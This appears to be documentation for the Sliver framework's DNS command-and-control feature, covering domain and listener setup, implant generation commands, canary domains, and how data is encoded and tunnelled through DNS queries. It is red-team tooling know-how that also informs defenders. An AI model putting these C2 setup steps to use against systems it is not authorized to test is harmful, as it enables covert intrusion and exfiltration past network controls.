DNS can be a finicky nuanced protocol, if you're unfamiliar with DNS and related concepts I'd recommending reading up on the protocol and ecosystem a bit before leveraging it for C2.

# Setup

Use the following steps to configure a domain for DNS C2 (and DNS Canaries), you can use any DNS provider you wish as long as you setup the records correctly. I recommend setting a TTL of ~5 minutes for each record.

1. Create an `A` record for your `example.com` pointing at your Sliver server (or redirector) IP address.
2. Create an `A` record for an `ns1` subdomain (i.e. `ns1.example.com`) that points to your Sliver server (or redirector) IP address.
3. Create an NS record with an arbitrary subdomain, for example `1` (i.e. `1.example.com`) which is managed by `ns1.example.com`.
4. You can now use `1.example.com` as your DNS C2 domain e.g. `generate --dns 1.example.com.` (always use the FQDN when issuing DNS commands).

**IMPORTANT:** Always use the FQDN when issuing DNS commands in the Sliver console (e.g., `1.example.com.` note the trailing `.`). DNS is a finicky protocol!

The final configuration should look like for the domain `lil-peep.rip`:
![DNS Configuration](/images/dns-c2-1.png)

**IMPORTANT:** Remember to disable Cloudflare's "cloud" when configuring these records, and to adjust the TTLs.

### DNS Listeners

Make sure you have a DNS listener running, and to use the FQDN again. Sliver will not be able to correctly parse C2 traffic if the parent domain is misconfigured:

```
sliver > dns --domains 1.example.com.

[*] Starting DNS listener with parent domain(s) [1.example.com.] ...
[*] Successfully started job #1
```

### DNS Canaries

DNS Canaries are unique per-binary domains that are optionally inserted during the string obfuscation process. These domains are not actually used by the implant code and are deliberately _not obfuscated_ so that they show up if someone runs `strings` on the implant. If these domains are ever resolved (and you have a `dns` listener running) you'll get an alert telling which specific file was discovered by the blue team.

Example `generate` command with canaries, make sure to use the FQDN:

```
sliver > generate --http foobar.com --canary 1.example.com.
```

You can view previously generated canaries with the `canaries` command.

### Ubuntu

**NOTE:** On recent versions of Ubuntu, you may need to disable `systemd-resolved` as this binds to your local UDP:53 and messes up everything about how DNS is supposed to work. To use a sane DNS configuration run the following commands as root because `resolved` probably broke `sudo` too:

```
systemctl disable systemd-resolved.service
systemctl stop systemd-resolved
rm -f /etc/resolv.conf
vim /etc/resolv.conf
```

Add a normal `resolv.conf`:

```
nameserver 1.1.1.1
nameserver 8.8.8.8
```

# Under the Hood

**NOTE:** This describes the v1.5+ implementation of DNS C2. Also, I'm not going to cover the cryptographic key exchange, which you can read about [here](/docs?name=Transport+Encryption), this is just about how do we move bytes back and forth.

### Design Goals

The current implementation of DNS C2 is primarily designed for "speed" (as far as DNS tunnels go) NOT stealth; it does not intend to be subtle in its use of DNS to tunnel data. While DNS can be a very useful protocol for stealthy signaling, Sliver here is creating a full duplex tunnels, doing so covertly would generally be far too slow to be practical. The general rule of thumb is that DNS C2 is easy to detect _if you look_. That's not to say DNS C2 isn't useful or will be immediately detected as is often no one looks. As DNS does not require direct "line of sight" networking, it is often useful for tunneling out of highly restricted networks, and if the environment has not been instrumented to specifically detect DNS C2 it will likely go undetected.

For example glossing over some details, if a DNS client attempts to `foo.1.example.com` it will query it's local resolver for an answer. If the resolver does not know the answer it will start "recursively" resolving the domain eventually finding its way to the "authoritative name server" for the domain, which is controlled by the owner of `example.com`. DNS C2 works by stuff data in a subdomain, and then sending a query for that subdomain to the authoritative name server.

```
[implant] <--> [resolver]
                  |<------> [.]
                  |<------> [.com.]
                  |<------> [example.com.] (attacker controlled)
```

This allows an implant to establish a connection to an attacker controlled host even when the implant cannot route TCP or UDP traffic to the internet. The tradeoff is that DNS queries are generally very small, in fact if we're lucky we can maybe encode around ~175 bytes per query (more on that later). So if you want to download a 2Mb file then we're gonna have to send _a lot of_ queries, this means that DNS communication is going to be _slow_ (~30Kbps) even at the best of times.

### Rude DNS Resolvers

The novice hacker often may think that something like DNS, being a fundamental building block of the internet, would be strictly defined and implemented. This of course could not be further from reality; the DNS protocol specification is really more what you call "guidelines" than actual rules. It is common for DNS resolvers to ignore TTL values, modify query contents, drop packets, and lie in responses. Since we cannot control what resolvers we may need use in an operational environment, and we want to build reliable C2 connections, we must expect this type of behavior and design around it.

### Encoder Selection

So if we want to build a "fast" DNS tunnel, we need to be able to pack as much data into each request as possible, more data per query the fewer queries we need to send for a given message.

So how much data can we stuff into a DNS query? Well let's take a look at what goes into a DNS query, a DNS query contains some header fields and then a "questions" section, a single query may contain multiple questions. For example, we can ask "is there an A record for example.com" (an A records contain IPv4 addresses). Now, we can encode a handful of bits into some of the header fields and a couple other sections like the Type/Class, but by far the largest field is `QNAME`, which contains the domain we're asking a question about:

```
                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                     QNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QTYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QCLASS                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

Thus we'll focus on encoding data into the `QNAME` (the domain), domains can be up to 254 characters in length and may only contain ASCII `a-z`, `A-Z`, `0-9`, `-`, but `-` may not appear at the beginning of a name, and of course `.` separators. Each subdomain is separated by a `.` and may be up to 63 characters in length. However, DNS is a case-insensitive protocol thus `a` and `A` are considered equal from DNS' standpoint. Now as I said before the spec is really more guidelines than rules, so both `a` and `A` are technically allowed they're just considered equal in DNS' semantics.

Now we want to send arbitrary binary data but DNS does not allow binary data in the `QNAME` so we need to encode binary data into the allowed character set. Typically of course to encode arbitrary binary data into ASCII we'd use [Base64](https://en.wikipedia.org/wiki/Base64) encoding, but DNS only allows 62 distinct characters (`a-z`, `A-Z`, `0-9`) so Base64 cannot be used. Additionally, we must consider that to Base64 `a` and `A` are distinct values whereas to DNS they are not. So it may not always be safe to use a case-sensitive encoding like Base64 if some rude resolver were to convert all the characters in one of our `QNAME`s to lower case. As far as DNS is concerned this is just fine, but it would corrupt the bytes decoded by the server.

To workaround this problem many DNS C2 implementations instead use hexadecimal encoding, which is not case-sensitive and uses only characters (`0-9`, `A-F`), which are allowed in a `QNAME`, to transfer data back and forth from the server. The issue with this is that hexadecimal is a very inefficient encoding, resulting in a x2 size (takes two bytes to encode one byte), and since we want to minimize the number of queries we need to send this isn't a great option. Instead we could use [Base32](https://en.wikipedia.org/wiki/Base32), which is also case-insensitive but uses more characters to display bytes and thus is more efficient at around x1.6 size. Even better yet would be [Base58](https://en.wikipedia.org/wiki/Binary-to-text_encoding#Base58), which is case sensitive like Base64 but only uses chars allowed in a `QNAME`, at a little over x1.33 message size, but we cannot always rely on being able to use Base58 if we encounter a rude resolver.

Sliver's solution to this problem is to first try to detect if Base58 can be used to reliably encode data, and if a problem is detected then fallback to Base32. I call this process "fingerprinting" the resolver.

### Fingerprinting Rude Resolvers

The most common DNS query is an `A` record asking for the IPv4 address associated with some domain name. An IPv4 address is a 4-byte value typically displayed as four octets in Base10 e.g. `192.168.1.1`, but to DNS this is just an arbitrary 4-byte (32-bit) value.

In order to detect if a resolver corrupted any bytes in our message the authoritative name server encodes the [CRC32](https://en.wikipedia.org/wiki/Cyclic_redundancy_check) of the data it received in the IP address of any `A` record that it receives. The implant first generates random bytes and then for each resolver on a host we try to resolve these random bytes and check to see if the CRC32 calculated by the server matches the CRC32 of the data we sent. If any mismatches occur Base32 is used instead of Base58.

### Bytes Per Query

Since the encoder used to send data is selected at runtime, as described above, the number of bytes that can be encoded into a query depends on both the length of the parent domain and the encoder selected. Therefore given some message of `n` bytes we must dynamically determine how many queries are needed to send the message.

First we calculate how many characters of the total domain can be used to encode data, which depends on the length of the parent domain. A maximum of 254 characters per domain always applies regardless of the number of subdomains. So for example we have more space leftover when using `1.abc.com` (254 - 9 = 245) vs. `a.thisisalongdomainname.com` (254 - 27 = 227), however we must also account for `.` every 63 characters, and the number of these may differ depending on the space leftover after the parent domain. The number of characters that can be used to represent data I call the "subdata space" (i.e., not counting the parent domain and `.`'s) and is calculated as:

```go
254 - len(parent) - (1 + (254-len(parent))/64)
```

This "subdata space" is the maximum number of characters our encoder (Base32 or Base58) can output per message. So the bytes per message are essentially `n` bytes encoded length must be equal to or less than the subdata space. Its important to note that adding a single byte input to either Base32 or Base58 may result in +2 output characters due to the inefficiencies in the encoders.

### Parallel Send/Recv

In addition to optimizing our use of encoders, we can also increase performance if we can send queries with encoded data out of order, or that is to say in parallel, since sending in parallel will most assuredly result in messages arriving at the server out of order.

To account for this, Sliver wraps the message of `n` bytes in a protobuf message that contains some metadata:

```protobuf
message DNSMessage {
    DNSMessageType Type = 1; // An enum type
    uint32 ID = 2; // 8 bit message id + 24 bit dns session ID
    uint32 Start = 3; // These bytes of `Data` start at
    uint32 Stop = 4; // These bytes of `Data` stop at
    uint32 Size = 5; // Total message size (e.g. last message Stop = Size)
    bytes Data = 6; // Actual data
}
```

This does result in some overhead, and we must account for this as part of the bytes-per-query math.

Since each message contains ordering and size data the server can now receive any part of the message in any order and sort/reconstruct the original message once all the pieces have been received.
